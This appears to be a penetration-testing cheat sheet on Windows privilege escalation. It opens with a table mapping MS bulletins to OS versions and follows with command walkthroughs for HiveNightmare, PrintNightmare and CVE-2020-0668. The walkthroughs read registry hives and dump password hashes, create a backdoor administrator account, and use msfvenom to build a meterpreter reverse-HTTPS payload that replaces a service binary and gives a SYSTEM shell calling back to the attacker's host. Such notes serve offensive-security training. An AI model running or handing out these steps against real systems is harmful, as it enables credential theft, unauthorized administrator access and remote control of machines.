# Kernel Exploits

| Base OS                                | XP  |     |     |     | 2003 |     |     | Vista |     |     | 2008 |     | 7   |     | 2008R2 |     | 8 | 8.1 | 2012 | 2012R2 | 10 | 2016 |
| -------------------------------------- | --- | --- | --- | --- | ---- | --- | --- | ----- | --- | --- | ---- | --- | --- | --- | ------ | --- | - | --- | ---- | ------ | -- | ---- |
| Service Pack                           | SP0 | SP1 | SP2 | SP3 | SP0  | SP1 | SP2 | SP0   | SP1 | SP2 | SP0  | SP2 | SP0 | SP1 | SP0    | SP1 |   |     |      |        |    |      |
| MS03-026                               | •   | •   | •   | •   | •    | •   | •   |       |     |     |      |     |     |     |        |     |   |     |      |        |    |      |
| MS05-039                               | •   | •   | •   |     | •    | •   |     |       |     |     |      |     |     |     |        |     |   |     |      |        |    |      |
| MS08-025                               | •   | •   | •   |     | •    | •   | •   | •     | •   |     | •    |     |     |     |        |     |   |     |      |        |    |      |
| MS08-067                               | •   | •   | •   | •   | •    | •   | •   | •     | •   |     | •    |     |     |     |        |     |   |     |      |        |    |      |
| MS08-068                               | •   | •   | •   | •   | •    | •   | •   | •     | •   |     | •    |     |     |     |        |     |   |     |      |        |    |      |
| MS09-012                               | •   | •   | •   | •   | •    | •   | •   | •     | •   |     | •    |     |     |     |        |     |   |     |      |        |    |      |
| MS09-050                               |     |     |     |     |      |     |     | •     | •   | •   | •    | •   |     |     |        |     |   |     |      |        |    |      |
| MS10-015                               |     |     | •   | •   | •    | •   | •   | •     | •   | •   |      |     |     |     |        |     |   |     |      |        |    |      |
| MS10-059                               |     |     |     |     |      |     |     | •     | •   | •   | •    | •   | •   |     | •      |     |   |     |      |        |    |      |
| MS10-092                               |     |     |     |     |      |     |     | •     | •   | •   | •    | •   | •   |     | •      |     |   |     |      |        |    |      |
| MS11-011                               |     |     |     | •   | •    | •   | •   | •     | •   | •   | •    | •   | •   |     | •      |     |   |     |      |        |    |      |
| MS11-046                               |     |     |     | •   | •    | •   | •   | •     | •   | •   | •    | •   | •   | •   | •      | •   |   |     |      |        |    |      |
| MS11-062                               |     |     |     | •   | •    | •   | •   |       |     |     |      |     |     |     |        |     |   |     |      |        |    |      |
| MS11-080                               |     |     |     | •   | •    | •   | •   |       |     |     |      |     |     |     |        |     |   |     |      |        |    |      |
| MS13-005                               |     |     |     |     |      |     |     | •     | •   | •   | •    | •   | •   | •   | •      | •   | • |     | •    |        |    |      |
| MS13-053                               |     |     |     | •   | •    | •   | •   | •     | •   | •   | •    | •   | •   | •   | •      | •   | • |     | •    |        |    |      |
| MS13-081                               |     |     | •   | •   | •    | •   | •   | •     | •   | •   | •    | •   | •   | •   | •      | •   | • |     | •    |        |    |      |
| MS14-002                               |     |     |     | •   | •    | •   | •   |       |     |     |      |     |     |     |        |     |   |     |      |        |    |      |
| MS14-040                               |     |     |     |     | •    | •   | •   | •     | •   | •   | •    | •   | •   | •   | •      | •   | • | •   | •    | •      |    |      |
| MS14-058                               |     |     |     |     | •    | •   | •   | •     | •   | •   | •    | •   | •   | •   | •      | •   | • | •   | •    | •      |    |      |
| MS14-062                               |     |     |     |     | •    | •   | •   |       |     |     |      |     |     |     |        |     |   |     |      |        |    |      |
| MS14-068                               |     |     |     |     | •    | •   | •   | •     | •   | •   | •    | •   | •   | •   | •      | •   | • | •   | •    | •      |    |      |
| MS14-070                               |     |     |     |     | •    | •   | •   |       |     |     |      |     |     |     |        |     |   |     |      |        |    |      |
| MS15-001                               |     |     |     |     |      |     |     |       |     |     |      |     | •   | •   | •      | •   | • | •   | •    | •      |    |      |
| MS15-010                               |     |     |     |     | •    | •   | •   | •     | •   | •   | •    | •   | •   | •   | •      | •   | • | •   | •    | •      |    |      |
| MS15-051                               |     |     |     |     | •    | •   | •   | •     | •   | •   | •    | •   | •   | •   | •      | •   | • | •   | •    | •      |    |      |
| MS15-061                               |     |     |     |     | •    | •   | •   | •     | •   | •   | •    | •   | •   | •   | •      | •   | • | •   | •    | •      |    |      |
| MS15-076                               |     |     |     |     | •    | •   | •   | •     | •   | •   | •    | •   | •   | •   | •      | •   | • | •   | •    | •      |    |      |
| MS15-078                               |     |     |     |     |      |     |     | •     | •   | •   | •    | •   | •   | •   | •      | •   | • | •   | •    | •      |    |      |
| MS15-097                               |     |     |     |     |      |     |     | •     | •   | •   | •    | •   | •   | •   | •      | •   | • | •   | •    | •      | •  |      |
| MS16-016                               |     |     |     |     |      |     |     | •     | •   | •   | •    | •   | •   | •   | •      | •   |   |     |      |        |    |      |
| MS16-032                               |     |     |     |     |      |     |     | •     | •   | •   | •    | •   | •   | •   | •      | •   |   | •   | •    | •      |    |      |
| MS16-135                               |     |     |     |     |      |     |     | •     | •   | •   | •    | •   | •   | •   | •      | •   |   | •   | •    | •      | •  | •    |
| MS17-010                               |     |     |     |     |      |     |     | •     | •   | •   | •    | •   | •   | •   | •      | •   | • | •   | •    | •      | •  | •    |
| CVE-2017-0213: COM Aggregate Marshaler |     |     |     |     |      |     |     |       |     |     |      |     | •   | •   | •      | •   | • | •   | •    | •      | •  | •    |
| Hot Potato                             |     |     |     |     |      |     |     |       |     |     |      |     | •   | •   | •      | •   | • | •   | •    | •      | •  |      |
| SmashedPotato                          |     |     |     |     |      |     |     |       |     |     |      |     | •   | •   | •      | •   | • | •   | •    | •      | •  |      |

Note: This table is not 100% complete, and does not go past 2017. As of today, there are more known vulnerabilities for the newer operating system versions and even Server 2019.

It is important to note that while some of the examples above are remote code execution vulnerabilities, we can just as easily use them to escalate privileges. One example is if we gain access to a system and notice a port such as 445 (SMB service) not accessible from the outside, we may be able to privilege escalate if it is vulnerable to something such as EternalBlue (MS17-010). In this case, we could either port forward the port in question to be accessible from our attack host or run the exploit in question locally to escalate privileges.

### CVE-2021-36934 - HiveNightmare

`CVE-2021-36934 HiveNightmare, aka SeriousSam` is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level

```shellscript
# Checking permissions of the SAM file => look for common users like BUILTIN\Users
# that have permissions to read the file
icacls c:\Windows\System32\config\SAM

# Execute the exploit => creates copies of SAM, SYSTEM and SECURITY
https://github.com/GossiTheDog/HiveNightmare
.\HiveNightmare.exe

# Exfiltrate the Hives and dump the hashes offline
impacket-secretsdump -sam <SAM> -system <SYSTEM> -security <SECURITY> LOCAL
```

### CVE-2021-1675/CVE-2021-34527 - PrintNightmare

`CVE-2021-1675/CVE-2021-34527 PrintNightmare` is a flaw in [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege `SeLoadDriverPrivilege` the ability to add drivers to a remote Print Spooler. This right is typically reserved for users in the built-in Administrators group and Print Operators who may have a legitimate need to install a printer driver on an end user's machine remotely. The flaw allowed any authenticated user to add a print driver to a Windows system without having the privilege mentioned above, allowing an attacker full remote code execution as SYSTEM on any affected system

```shellscript
# Check for the Spooler service 
ls \\localhost\pipe\spoolss

# Bypass the execution policy => Press A 
Set-ExecutionPolicy Bypass -Scope Process

# Import the module and execute the payload
# We can supply a custom DLL payload if we want a reverse shell
https://github.com/calebstewart/CVE-2021-1675
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

# Confirm the new user => should be part of Administrators group
net user hacker
```

### Enumerating Missing Patches

```shellscript
# Examine the installed updates
systeminfo
wmic qfe list brief
Get-Hotfix

# Then search the KB number to get the date of the last update
```

### CVE-2020-0668 - Windows Kernel Elevation of Privilege Vulnerability

{% embed url="https://github.com/RedCursorSecurityConsulting/CVE-2020-0668" %}

[Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/), which exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a `.OLD` extension when the service is triggered. This move operation is performed by `NT AUTHORITY\SYSTEM`, and can be abused to move a file of our choosing with the help of mount points and symbolic links.

At this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\Windows\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.

We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below at `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

```shellscript
# Check permissions on binary => we want execute and read
# This binary is good because non privileged users have the right to restart it
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Generate a malicious binary that has the same name as the one above
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f exe > maintenanceservice.exe

# We need to download the malicious binary on the target AND MAKE 2 COPIES

# Execute the payload
.\CVE-2020-0668.exe <maintenanceservice.exe> "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Check permissions on the binary again, and we should have control over it
icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'

# Copy the 2nd copy to the binary, as the first one is now corrupted
# The copy command only works from cmd, not Powershell
# Once copied, make sure to change the name to remove the trailing 2
copy /Y <maintenanceservice2.exe> "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Start a listener on msfconsole, start the service and get a shell
net start MozillaMaintenance 
```
